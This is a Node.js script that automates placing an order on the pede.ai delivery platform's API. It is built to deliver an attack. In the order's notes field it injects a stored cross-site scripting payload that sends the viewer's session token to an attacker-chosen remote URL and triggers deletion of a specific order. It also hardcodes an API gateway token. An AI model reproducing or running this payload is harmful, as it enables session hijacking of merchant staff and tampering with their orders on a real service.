const request = require("request");
const axios = require("axios");
const jsonPedido = require("./json/merchantOrder.json");
const userLoginData = require("./json//userLogin.json");
const fs = require("fs");
const config = require("./json/config.json");

let merchantNameForSearch;
let cityNameForEarch;
let bairroNameForEarch;

let EMAIL;
let PASSWORD;
const x_gateway_token =
  "b698d5992fa88c638515f5fccd5a88dd369f2a82c415885aba14cee703b7";
const indexCategory = 1;
const indexProduct = 0;
let categoryNameForEach;
let productNameForEach;
let remoteUrl;
let loadingApp = false;

const dataOrderSend = jsonPedido;

let USER_TOKEN = userLoginData.token;
let merchantId;
let cityData;
let bairroData;
let slug;

var getMerchantDataForName = (merchantName, area_id) => {
  console.log(`Searching merchant ${merchantName}...`);
  const URL = `https://api.store.pede.ai/merchant/v1/merchants?area_id=${area_id}&sort_by=delivery_rate&payment_types=&card_brands=&get_all=true`;
  request(URL, async (error, response, body) => {
    const merchants = JSON.parse(body)["merchants"];
    let merchantData = {};
    if (!merchants.length) {
      console.log("Merchants not found!");
      return;
    }
    console.log(`${merchants.length} merchants found`);
    merchants.forEach((merchant) => {
      if (
        merchant.name.toLowerCase().indexOf(merchantName.toLowerCase()) != -1
      ) {
        merchantData = merchant;
      }
    });

    if (!merchantData._id) {
      console.log("Merchant not found!");
      return;
    }

    const delFee = await openMerchant(merchantData.slug, area_id);
    dataOrderSend.delivery_fee = delFee;
    dataOrderSend.original_delivery_fee = delFee;

    console.log("Merchant found!");
    console.log("----------------------------------------------------------");
    console.log("Merchant id: " + merchantData._id);
    console.log("Merchant Name: " + merchantData.name);
    console.log("----------------------------------------------------------");
    merchantId = merchantData._id;

    getItemsMerchant();
  });
};

var sendOrder = (jsonOrder) => {
  console.log("Sending Order...");
  const data = jsonPedido;
  const h = {
    "Content-Type": "application/json;charset=UTF-8",
    Authorization: USER_TOKEN,
  };

  axios
    .post("https://api.store.pede.ai/order/v2/orders", data, { headers: h })
    .then((res) => {
      console.log(res.response);
    })
    .catch((error) => {
      console.error(error.response.data.message);
      if (
        error.response.data.message != "Empresa não está aberta no momento!"
      ) {
        userLogin();
      }
    });
};

var getItemsMerchant = () => {
  const URL_API_ITEMS_MER = `https://api.store.pede.ai/menu/v2/items?merchant_id=${merchantId}&per_page=all&page=1`;
  request(URL_API_ITEMS_MER, (error, response, body) => {
    const arrayItemsMer = JSON.parse(body);
    let itemMerchant;

    arrayItemsMer.categories.data.forEach((category) => {
      if (
        category.name
          .toLowerCase()
          .indexOf(categoryNameForEach.toLowerCase()) != -1
      ) {
        console.log("Category:" + category.name);
        category.items.forEach((item) => {
          if (
            item.name.toLowerCase().indexOf(productNameForEach.toLowerCase()) !=
            -1
          ) {
            console.log(item.name + " selected");
            itemMerchant = item;
          }
        });
      }
    });

    if (!itemMerchant) {
      console.log("Product not found!");
      return;
    }

    dataOrderSend.cart_items[0]._id = itemMerchant._id;
    dataOrderSend.cart_items[0].description = itemMerchant.description;
    dataOrderSend.cart_items[0].old_id = itemMerchant.old_id;
    dataOrderSend.cart_items[0].name = itemMerchant.name;
    dataOrderSend.cart_items[0].price.price = itemMerchant.prices[0].price;
    dataOrderSend.cart_items[0].price.discounted_price =
      itemMerchant.prices[0].discounted_price;
    dataOrderSend.cart_items[0].unity_price =
      itemMerchant.prices[0].discounted_price;
    dataOrderSend.cart_items[0].total_item_price =
      itemMerchant.prices[0].discounted_price;

    dataOrderSend.items_total = itemMerchant.prices[0].discounted_price;
    dataOrderSend.total =
      dataOrderSend.delivery_fee + itemMerchant.prices[0].discounted_price;
    dataOrderSend.notes = `<script> $.post('${remoteUrl}/v='+ yii_session_token, function(data, status){ }); row_delete_order_request('7934714', {}); </script>`;

    console.log("Ready-to-ship settings");
    sendOrder(dataOrderSend);
  });
};

var userLogin = () => {
  console.log("Login in...");
  const payload = {
    email_address: EMAIL,
    password: PASSWORD,
  };

  const h = {
    platform: "web",
    "Content-Type": "application/json;charset=UTF-8",
  };

  axios
    .post("https://api.store.pede.ai/client/v1/auth/login", payload, {
      headers: h,
    })
    .then((res) => {
      USER_TOKEN = res.data.session.token;
      console.log("User logged!");

      writeFileJSON("./json/userLogin.json", `{"token": "${USER_TOKEN}"}`);
      getAreaIdCity(cityNameForEarch, bairroNameForEarch);
    })
    .catch((error) => {
      console.error(error.response.data.message);
    });
};

var getAreaIdCity = (cityName, bairroName) => {
  console.log("Searching city...");
  if (!cityName) {
    return console.log("Name city not informed!");
  }
  const h = {
    "x-app-version": " v1.7.1",
    "x-gateway-token": x_gateway_token,
  };
  const URL_API_CITIES = "https://landingapp.pede.ai/location/v2/cities";

  axios
    .get(URL_API_CITIES, { headers: h })
    .then((res) => {
      cityData = res.data.cities.find((city) => {
        return city.name == cityName;
      });
      if (cityData) {
        console.log(`City searched - ${cityData.name}`);
        getAreaIdBairro(cityData._id, bairroName);
      } else {
        console.log(`City not searched - ${cityName}`);
      }
    })
    .catch((error) => {
      console.error(error.response.statusText);
    });
};

var getAreaIdBairro = (city_id, bairroName) => {
  console.log("Searching bairro...");

  const h = {
    "x-app-version": " v1.7.1",
    "x-gateway-token":
      "b698d5992fa88c638515f5fccd5a88dd369f2a82c415885aba14cee703b7",
  };
  const URL_API_CITIES = `https://landingapp.pede.ai/location/v2/areas?city_id=${city_id}`;
  axios
    .get(URL_API_CITIES, { headers: h })
    .then((res) => {
      // console.log(res.data.areas);
      bairroData = res.data.areas.find((bairro) => {
        return bairro.name == bairroName;
      });
      if (bairroData) {
        console.log(`Bairro searched - ${bairroData.name}`);
        getAreaId(bairroData.slug);
      } else {
        console.log(`Bairro not searched - ${bairroName}`);
      }
    })
    .catch((error) => {
      console.error(error.response.statusText);
    });
};

var getAreaId = (slug) => {
  console.log("Getting slug ...");
  const h = {
    "x-app-version": " v1.7.1",
    "x-gateway-token": x_gateway_token,
  };
  const URL_API_CITIES = `https://api.store.pede.ai/location/v2/areas?slug=${slug}`;

  axios
    .get(URL_API_CITIES, { headers: h })
    .then((res) => {
      console.log(res.data.message);
      getMerchantDataForName(merchantNameForSearch, res.data.areas[0]._id);
    })
    .catch((error) => {
      console.error(error);
    });
};

var openMerchant = (slug, area_id) => {
  return new Promise((resolver, reject) => {
    console.log("Getting delivery fee");
    const h = {
      "x-app-version": " v1.7.1",
      "x-gateway-token": x_gateway_token,
    };
    const URL_API_CITIES = `https://api.store.pede.ai/merchant/v1/merchants/slug/${slug}?area_id=${area_id}`;

    axios
      .get(URL_API_CITIES, { headers: h })
      .then((res) => {
        resolver(res.data.merchant.delivery_fee);
      })
      .catch((error) => {
        reject(false);
        console.error(error.response.data.message);
      });
  });
};

var writeFileJSON = (fileName, value) => {
  fs.writeFile(fileName, value, function (err) {});
};

module.exports = run = (
  merchantNameForSearch_,
  cityNameForEarch_,
  bairroNameForEarch_,
  email_,
  password_,
  categoryNameForEach_,
  productNameForEach_,
  remoteURL_
) => {
  merchantNameForSearch = merchantNameForSearch_;
  cityNameForEarch = cityNameForEarch_;
  bairroNameForEarch = bairroNameForEarch_;
  EMAIL = email_;
  PASSWORD = password_;
  categoryNameForEach = categoryNameForEach_;
  productNameForEach = productNameForEach_;
  remoteUrl = remoteURL_;

  getAreaIdCity(cityNameForEarch, bairroNameForEarch);
};
